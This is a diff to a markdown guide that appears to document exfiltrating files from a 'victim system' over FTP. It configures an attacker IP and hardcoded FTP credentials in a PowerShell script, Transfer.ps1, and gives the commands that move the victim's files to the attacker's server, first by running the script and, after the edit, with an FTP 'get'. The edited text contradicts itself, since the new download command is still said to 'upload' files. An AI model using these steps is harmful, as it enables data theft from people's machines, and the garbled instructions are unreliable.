@@ -96,7 +96,6 @@ Replace `<attacker-ip>` with your actual IP address.
 
   * The FTP server is running on the port defined in the script (default: `21`).
   * A directory named `uploads` exists on the FTP server.
-  * The credentials used in `Transfer.ps1` (username & password) match your server configuration.
 
 ---
 
@@ -109,20 +108,16 @@ $ftpserver      = "192.168.1.10"
 $ftpport        = 21
 $ftpusername    = "ftpuser"
 $ftppassword    = "password123"
-$localfilepath  = "C:\Path\To\Your\Files\File_name"
-$remotefilename = "Output_File_Name_you_want_on_the_server" 
 ```
-
-
 
 ---
 
-#### **4. Execute the File Transfer**
+#### **4. Transfer the files**
 
-Run the transfer script from the victim system:
+The commad to download the file from the victim is as follows:
 
 ```powershell
-& "C:\Windows\System32\Transfer.ps1"
+get "File_Name"
 ```
 
 This will upload the specified file(s) to your FTP server’s `/uploads` directory.
